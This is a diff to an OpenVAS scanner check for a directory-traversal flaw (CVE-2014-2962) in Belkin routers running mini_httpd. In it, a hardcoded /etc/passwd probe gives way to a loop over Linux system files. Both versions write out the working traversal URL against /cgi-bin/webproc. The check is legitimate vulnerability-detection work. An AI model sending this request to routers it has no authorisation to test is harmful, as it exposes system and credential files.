@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_belkin_router_dir_trav_vuln.nasl 11409 2018-09-15 12:30:12Z cfischer $
+# $Id: gb_belkin_router_dir_trav_vuln.nasl 11831 2018-10-11 07:49:24Z jschulte $
 #
 # Belkin Router Directory Traversal Vulnerability
 #
@@ -27,11 +27,11 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.806147");
-  script_version("$Revision: 11409 $");
+  script_version("$Revision: 11831 $");
   script_cve_id("CVE-2014-2962");
   script_tag(name:"cvss_base", value:"7.8");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2018-09-15 14:30:12 +0200 (Sat, 15 Sep 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-11 09:49:24 +0200 (Thu, 11 Oct 2018) $");
   script_tag(name:"creation_date", value:"2015-10-29 12:12:25 +0530 (Thu, 29 Oct 2015)");
   script_tag(name:"qod_type", value:"remote_vul");
   script_name("Belkin Router Directory Traversal Vulnerability");
@@ -52,9 +52,7 @@ if(description)
 
   script_tag(name:"solution", value:"As a workaround ensure that appropriate
   firewall rules are in place to restrict access to port 80/tcp from external
-  untrusted sources.
-
-  For more information refer to http://www.belkin.com");
+  untrusted sources.");
 
   script_tag(name:"solution_type", value:"Workaround");
 
@@ -66,7 +64,8 @@ if(description)
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
   script_family("Web application abuses");
-  script_dependencies("gb_get_http_banner.nasl");
+  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
+  script_require_keys("Host/runs_unixoide");
   script_mandatory_keys("mini_httpd/banner");
   script_require_ports("Services/www", 80);
 
@@ -75,6 +74,7 @@ if(description)
 
 include("http_func.inc");
 include("http_keepalive.inc");
+include("misc_func.inc");
 
 asport = get_http_port(default:80);
 
@@ -83,17 +83,25 @@ if(!banner){
   exit(0);
 }
 
+files = traversal_files("linux");
+
 if(banner =~ 'Server: mini_httpd')
 {
-  url = "/cgi-bin/webproc?getpage=../../../../../../../../../../etc/passwd&" +
-      "var:getpage=html/index.html&var:language=en_us&var:oldpage=(null)&" +
-      "var:page=login";
 
-  if(http_vuln_check(port:asport, url:url, pattern:"root:.*:0:[01]:"))
-  {
-    report = report_vuln_url( port:asport, url:url );
-    security_message(port:asport, data:report);
-    exit(0);
+  foreach pattern(keys(files)) {
+
+    file = files[pattern];
+
+    url = "/cgi-bin/webproc?getpage=../../../../../../../../../../" + file + "&" +
+        "var:getpage=html/index.html&var:language=en_us&var:oldpage=(null)&" +
+        "var:page=login";
+
+    if(http_vuln_check(port:asport, url:url, pattern:pattern))
+    {
+      report = report_vuln_url(port:asport, url:url);
+      security_message(port:asport, data:report);
+      exit(0);
+    }
   }
 }
 
